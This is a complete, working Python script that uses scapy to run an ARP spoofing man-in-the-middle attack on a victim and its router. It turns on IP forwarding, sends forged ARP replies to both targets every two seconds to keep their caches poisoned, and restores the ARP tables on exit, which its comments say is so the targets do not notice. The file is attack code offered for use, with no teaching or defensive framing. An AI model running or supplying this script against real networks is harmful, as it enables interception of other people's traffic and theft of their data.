#!/usr/bin/env python3
from scapy.all import ARP, Ether, sendp
import time
import subprocess
import sys

def enable_forwarding():
    """
    Enables IPv4 forwarding on the attacker's machine.
    This allows the machine to act as a gateway, passing traffic 
    between the victim and the router so the connection isn't dropped.
    """
    # Enables routing at the kernel level
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    # Ensures the firewall allows forwarded packets
    subprocess.run(["iptables", "-P", "FORWARD", "ACCEPT"])

def spoof_victim(victim_ip, victim_mac, attacker_mac, router_ip):
    """
    Sends a forged ARP reply to the victim.
    Tells the victim: "The Router's IP address is at my (Attacker's) MAC."
    """
    packet = Ether(dst=victim_mac) / ARP(
        op=2,                # ARP Reply
        pdst=victim_ip,      # Target (Victim) IP
        hwdst=victim_mac,    # Target (Victim) MAC
        hwsrc=attacker_mac,  # Forged MAC (Attacker's MAC)
        psrc=router_ip       # Forged IP (Router's IP)
    )
    sendp(packet, verbose=False)

def spoof_router(router_ip, router_mac, attacker_mac, victim_ip):
    """
    Sends a forged ARP reply to the router.
    Tells the router: "The Victim's IP address is at my (Attacker's) MAC."
    """
    packet = Ether(dst=router_mac) / ARP(
        op=2,                # ARP Reply
        pdst=router_ip,      # Target (Router) IP
        hwdst=router_mac,    # Target (Router) MAC
        hwsrc=attacker_mac,  # Forged MAC (Attacker's MAC)
        psrc=victim_ip       # Forged IP (Victim's IP)
    )
    sendp(packet, verbose=False)

def restore_network(victim_ip, victim_mac, router_ip, router_mac):
    """
    Restores the original ARP tables of the victim and the router.
    This 'heals' the connection so the targets don't notice the interruption.
    """
    print("\n[*] Restoring network state...")
    
    # Restore Router's view of the Victim
    router_packet = Ether(dst=router_mac) / ARP(
        op=2, pdst=router_ip, hwdst=router_mac, hwsrc=victim_mac, psrc=victim_ip
    )
    sendp(router_packet, count=5, verbose=False)

    # Restore Victim's view of the Router
    victim_packet = Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_ip, hwdst=victim_mac, hwsrc=router_mac, psrc=router_ip
    )
    sendp(victim_packet, count=5, verbose=False)

if __name__ == "__main__":
    # --- Configuration ---
    VICTIM_IP = ""
    VICTIM_MAC = ""
    ROUTER_IP = ""
    ROUTER_MAC = ""
    ATTACKER_MAC = ""

    # Initialize packet forwarding
    enable_forwarding()
    
    packet_count = 0
    print(f"[*] Starting ARP Spoofing between {VICTIM_IP} and {ROUTER_IP}")

    try:
        while True:
            # Poison the Victim's cache
            spoof_victim(VICTIM_IP, VICTIM_MAC, ATTACKER_MAC, ROUTER_IP)
            # Poison the Router's cache
            spoof_router(ROUTER_IP, ROUTER_MAC, ATTACKER_MAC, VICTIM_IP)
            
            packet_count += 2
            sys.stdout.write(f"\r[+] Packets sent: {packet_count}")
            sys.stdout.flush()
            
            # Send packets every 2 seconds to keep the cache poisoned
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[!] Stop requested by user.")
        restore_network(VICTIM_IP, VICTIM_MAC, ROUTER_IP, ROUTER_MAC)
        print("[+] ARP tables restored. Exiting.")
